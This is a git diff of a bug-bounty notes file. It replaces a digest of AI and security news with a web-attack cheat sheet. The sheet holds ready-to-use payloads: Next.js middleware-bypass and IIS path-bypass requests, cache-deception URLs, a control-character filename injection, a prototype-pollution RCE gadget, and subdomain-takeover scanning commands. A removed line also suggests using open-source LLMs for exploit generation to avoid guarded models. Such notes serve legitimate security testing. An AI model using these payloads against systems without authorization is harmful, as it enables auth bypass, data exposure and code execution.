@@ -1,106 +1,120 @@
-# misc-techniques
+# Miscellaneous Web Techniques
 
+> Catch-all for techniques that don't fit a single class — framework-specific bugs, middleware bypass, path confusion, and emerging attack surfaces.
 
-## 2026-04-16
+## Surface
 
-### Next.js Middleware Bypass (CVE-2025-29927) — `CVE-2025-29927`
-- **Tags:** `#nextjs` `#web`
-- **Severity:** unknown · **Hunt:** 4/5 · **Score:** 24.0 · **Status:** poc · **Age:** 0d
-- **Sources:** [1](https://www.assetnote.io/resources/research/doing-the-due-diligence-analyzing-the-next-js-middleware-bypass-cve-2025-29927)
+- Next.js middleware — wildcard route matching, `x-middleware-subrequest` bypass
+- IIS path normalization — trailing dots, semicolons, Unicode in path segments
+- WebSocket upgrade paths — HTTP-level attacks before protocol switch
+- Terminal emulator / IDE integrations — control character injection
+- Agentic workflows with tool-call APIs — IDOR + privilege escalation in agent-facing endpoints
+- Subdomain takeover — dangling DNS CNAME to unclaimed SaaS service
+- Cache deception — public cache stores authenticated responses via path suffix tricks
 
-- Insight: Next.js middleware bypass vulnerability stems from improper URL rewriting logic, allowing attackers to access protected routes by manipulating request segments.
-- Insight: Exploit chain involves crafting specially crafted request parameters that skip middleware execution, potentially exposing APIs, authentication systems, or internal endpoints.
-- Insight: Vulnerable configurations typically use dynamic route segments (e.g., `[[...slug]]`) with improper middleware scope enforcement.
-- Insight: Patch status remains unclear; affected versions likely include Next.js 13-15 due to middleware architecture changes.
-- Takeaway: Audit all middleware definitions, especially wildcards and nested routes, for scope enforcement gaps.
-- Takeaway: Test edge cases involving path normalization and URL rewriting in dev and preview environments.
+## Next.js Middleware Bypass
 
----
-### Enterprises power agentic workflows in Cloudflare Agent Cloud with OpenAI
-- **Tags:** `#cloudflare` `#llm` `#api`
-- **Severity:** unknown · **Hunt:** 1/5 · **Score:** 4.0 · **Status:** unknown · **Age:** 0d
-- **Sources:** [1](https://openai.com/index/cloudflare-openai-agent-cloud)
+CVE-2025-29927 class: middleware execution skipped via malformed path or internal header.
 
-- Cloudflare's integration of GPT-5.4 and Codex into its edge network enables low-latency, autonomous AI agents that can execute real-world tasks for enterprises.
-- The shift to "agentic workflows" expands the attack surface by giving AI models direct access to tools and APIs, moving the risk from prompt leakage to unauthorized actions (e.g., data exfiltration or modification).
-- The use of Codex implies code-execution capabilities within the agent's environment, increasing the potential impact of prompt injection attacks leading to remote code execution or supply chain compromise.
-- Securing these environments requires shifting focus from input filtering on the UI to strict validation and authorization checks on the *tool-calling* layer.
-- **Practical Takeaway:** When testing enterprise deployments, identify the API endpoints exposed to agents and probe them for IDOR or privilege escalation, as agents often run with high privileges but may lack granular security controls.
-- **Practical Takeaway:** Hunt for indirect prompt injection vectors in the data sources (e.g., web pages or emails) that these agents are designed to read and process.
+```
+# Test x-middleware-subrequest header (CVE-2025-29927)
+GET /admin/users HTTP/1.1
+Host: target.com
+x-middleware-subrequest: 1
 
----
-### Shadow Repeater: AI-enhanced manual testing
-- **Tags:** `#web` `#llm`
-- **Severity:** info · **Hunt:** 1/5 · **Score:** 1.0 · **Status:** unknown · **Age:** 0d
-- **Sources:** [1](https://portswigger.net/research/shadow-repeater-ai-enhanced-manual-testing)
+# Path normalization bypass
+GET /app/middleware/../admin HTTP/1.1
+GET /api/auth/protected%2F..%2Fadmin HTTP/1.1
+```
 
-- Addresses the common issue of missing vulnerabilities due to minor, incorrect assumptions made during manual testing.
-- Leverages Large Language Models (LLMs) to autonomously generate variations of requests sent via Burp Suite.
-- Acts as a "shadow" tester, exploring alternative input vectors and edge cases in the background while the user focuses on primary test paths.
-- Designed to augment human intuition rather than replace it, helping to overcome cognitive bias or tunnel vision.
-- **Takeaway**: Integrate Shadow Repeater into Burp Suite workflows to automatically generate "what if" scenarios for every manual request.
-- **Takeaway**: Review AI-suggested variations to identify logic flaws or parameter tampering opportunities that standard fuzzers might miss.
+Affected pattern: `middleware.ts` with wildcard matcher `[...slug]` or insufficient path checks.
 
----
-### Document My Pentest: AI-powered Burp extension for reporting
-- **Tags:** `#web` `#llm`
-- **Severity:** info · **Hunt:** 1/5 · **Score:** 1.0 · **Status:** unknown · **Age:** 0d
-- **Sources:** [1](https://portswigger.net/research/document-my-pentest)
+## IIS / Sitecore Auth Bypass
 
-- Introduces a new Burp AI extension designed to automate the creation of penetration test reports and audit trails directly from traffic.
-- Leverages Large Language Models (LLMs) to interpret HTTP interactions and generate structured documentation, reducing manual effort.
-- Aims to solve the "boring bits" of pentesting by transforming raw data into professional writeups in real-time.
-- Integrates seamlessly into the Burp Suite workflow, allowing security testers to focus on exploitation rather than documentation.
+IIS auth bypass via unusual path segments:
 
-**Practical Takeaways:**
-- Adopt this extension to significantly reduce the time spent on report writing, allowing for faster delivery of assessments.
-- Verify data privacy settings to ensure sensitive client traffic is handled appropriately when sent to the AI model.
+```
+# Trailing dot (IIS maps /path. to /path)
+GET /admin. HTTP/1.1
 
----
-### OpenAI Agents SDK native sandbox execution
-- **Tags:** `#llm` `#mcp` `#web` `#api`
-- **Severity:** info · **Hunt:** 1/5 · **Score:** 1.0 · **Status:** unknown · **Age:** 0d
-- **Sources:** [1](https://openai.com/index/the-next-evolution-of-the-agents-sdk)
+# Semicolon path injection
+GET /admin;test/ HTTP/1.1
 
-- Native sandbox execution provides isolation for agent operations, reducing blast radius but creating new attack surfaces for sandbox escape
-- Model-native harness integration simplifies complex workflow development by removing manual orchestration layers
-- Long-running agent support enables persistent automation across files and tools, increasing potential for privilege creep over time
-- Sandbox boundaries should be tested for file system escape, network egress, and inter-process communication leaks
-- MCP protocol integration may introduce supply chain risks if third-party tool providers are compromised
+# Case normalization (IIS case-insensitive)
+GET /ADMIN/ HTTP/1.1
+GET /%61dmin/ HTTP/1.1
+```
 
-**Practical takeaways:**
-- Audit sandbox configurations for restrictive filesystem and network policies before deployment
-- Implement resource quotas and timeout limits to prevent runaway agent consumption
+Sitecore 9.3: multiple RCE vectors and auth bypasses via IIS integration — prioritize if you see `/sitecore/` paths.
 
----
-### Trusted access for the next era of cyber defense
-- **Tags:** `#llm`
-- **Severity:** info · **Hunt:** 1/5 · **Score:** 1.0 · **Status:** unknown · **Age:** 0d
-- **Sources:** [1](https://openai.com/index/scaling-trusted-access-for-cyber-defense)
+## Subdomain Takeover
 
-- OpenAI is launching GPT-5.4-Cyber, a specialized model variant explicitly designed for cybersecurity defense tasks.
-- Access is gated through the "Trusted Access for Cyber" program, limiting availability to vetted security professionals to prevent misuse.
-- This release indicates a shift from general-purpose LLMs to domain-specific models with enhanced safeguards for high-risk sectors.
-- The integration suggests improved capabilities for malware analysis, threat intelligence processing, and defensive scripting at scale.
+```bash
+# Enumerate dangling CNAMEs
+subfinder -d target.com -silent | httpx -silent -status-code | grep 404
+# Cross-reference with known takeover-able services
+subjack -w subdomains.txt -t 100 -ssl -o results.txt
+nuclei -t takeovers/ -l subdomains.txt
+```
 
-**Practical Takeaways:**
-- Blue teams should prioritize enrollment in the Trusted Access program to utilize these tailored AI capabilities.
-- Red teams should anticipate better-guarded models and may need to rely on alternative open-source LLMs for automated exploit generation.
+High-value targets: Fastly, GitHub Pages, Heroku, Azure (azurewebsites.net), AWS (s3, elasticbeanstalk).
 
----
-### OpenAI Trusted Access for Cyber Program
-- **Tags:** `#web` `#api` `#cloud`
-- **Severity:** info · **Hunt:** 1/5 · **Score:** 0.5 · **Status:** unknown · **Age:** 30d
-- **Sources:** [1](https://openai.com/index/accelerating-cyber-defense-ecosystem)
+## Web Cache Deception
 
-- OpenAI launched a collaborative security program integrating GPT-5.4-Cyber with leading security firms and enterprises.  
-- Provides $10M in API grants to accelerate defensive capabilities across global cyber operations.  
-- Focuses on leveraging AI for enhanced threat detection, analysis, and response automation.  
-- Demonstrates industry-wide shift toward AI-integrated defensive ecosystems and collaborative security models.  
-- Signals maturation of LLMs as enterprise-grade security tools beyond offensive applications.  
+Force cache to store authenticated response at a public-facing path:
 
-**Practical takeaways:**  
-- Organizations can integrate this program to augment SOC capabilities with AI-driven threat analysis, especially for novel attack patterns.  
-- Highlights opportunity for security vendors to build complementary tools on OpenAI’s specialized cyber-defense APIs.
+```
+# Append cacheable suffix — proxy caches it, next visitor gets your data
+GET /account/profile/nonexistent.css HTTP/1.1
+GET /api/user/me/..%2Fstatic.js HTTP/1.1
+```
 
----
+Confirm: fetch URL unauthenticated from different IP — if you get the victim's data, it's cached.
+
+## Control Character Injection (Terminals/IDEs)
+
+ASCII control sequences in filenames or file content reach terminal emulators:
+
+```
+# SOH, STX, EOT in filenames execute in VS Code integrated terminal
+echo -e "\x01id\x0a" > "$(printf '\001id\012')"
+
+# Check: does app strip control chars before passing to shell/terminal?
+# Test with filename: test\x00.txt, test\x01.txt
+```
+
+## Prototype Pollution → RCE
+
+Node.js gadget chains via prototype pollution in merge/clone operations:
+
+```javascript
+// Pollute via JSON param
+{"__proto__": {"polluted": "yes"}}
+{"constructor": {"prototype": {"polluted": "yes"}}}
+
+// RCE via child_process gadget (specific framework versions)
+{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ"}}
+```
+
+Scan with: `ppmap` — automated prototype pollution scanner.
+
+## Tools
+
+- **nuclei** — misc CVE templates, subdomain takeover, middleware bypass: `nuclei -t misc/ -t takeovers/ -u https://target.com`
+- **subjack** — subdomain takeover checker
+- **ppmap** — prototype pollution scanner
+- **cariddi** — crawl + endpoint discovery for misc vulns
+
+## Chain Opportunities
+
+- **Subdomain takeover → CSP bypass** — control subdomain whitelisted in CSP, host XSS payload
+- **Cache deception → PII leak** — authenticated profile data cached and served to anyone with URL
+- **Next.js middleware bypass → auth bypass → IDOR → ATO** — skip auth middleware, access any user object
+- **Prototype pollution → RCE** — polluted property reaches `child_process.spawn` or `eval`
+- **Control char injection → RCE** — terminal processes injected control sequences as commands
+
+## Recent Intel
+
+- **CVE-2025-29927** · Next.js middleware bypass via `x-middleware-subrequest` header or path normalization — affected versions 13-15 with wildcard matchers · https://www.assetnote.io/resources/research/doing-the-due-diligence-analyzing-the-next-js-middleware-bypass-cve-2025-29927
+- **VS Code control character RCE** · ASCII SOH/STX/EOT in filenames or drag-and-drop content triggers terminal command execution — drag-and-pwnd technique, stealthy injection bypassing printable-char filters · https://portswigger.net/research/drag-and-pwnd-leverage-ascii-characters-to-exploit-vs-code
+- **Sitecore 9.3 IIS bypass** · Three distinct RCE vectors + two auth bypasses via IIS authorization integration — check `/sitecore/shell/` and `/sitecore/admin/` paths for exposed management handlers · https://www.assetnote.io/resources/research/bypass-iis-authorisation-with-this-one-weird-trick-three-rces-and-two-auth-bypasses-in-sitecore-9-3
